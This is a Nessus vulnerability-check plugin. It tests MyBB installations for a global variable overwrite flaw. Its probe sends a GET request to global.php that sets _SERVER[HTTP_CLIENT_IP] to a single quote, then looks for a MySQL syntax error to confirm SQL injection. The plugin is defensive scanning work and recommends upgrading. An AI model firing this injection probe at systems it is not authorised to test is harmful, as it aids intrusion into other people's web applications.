#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by a
global variable overwrite vulnerability. 

Description :

The remote version of MyBB does not properly initialize global
variables in the 'global.php' and 'inc/init.php' scripts.  An
unauthenticated attacker can leverage this issue to overwrite global
variables through GET and POST requests and launch other attacks
against the affected application. 

See also :

http://www.securityfocus.com/archive/1/431061/30/0/threaded
http://community.mybboard.net/showthread.php?tid=8232

Solution :

Upgrade to MyBB 1.1.1 or later.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(21239);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(17564);

  script_name(english:"MyBB Global Variable Overwrite Vulnerability");
  script_summary(english:"Checks for globals.php SQL injection vulnerability in MyBB");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));

if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to generate a SQL syntax error.
  req = http_get(
    item:string(
      dir, "/global.php?",
      "_SERVER[HTTP_CLIENT_IP]='", SCRIPT_NAME
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see a syntax error with our script name.
  if (egrep(pattern:string("mySQL error: 1064.+near '", SCRIPT_NAME, "''.+Query: SELECT sid,uid"), string:res)) {
    security_hole(port);
    exit(0);
  }
}
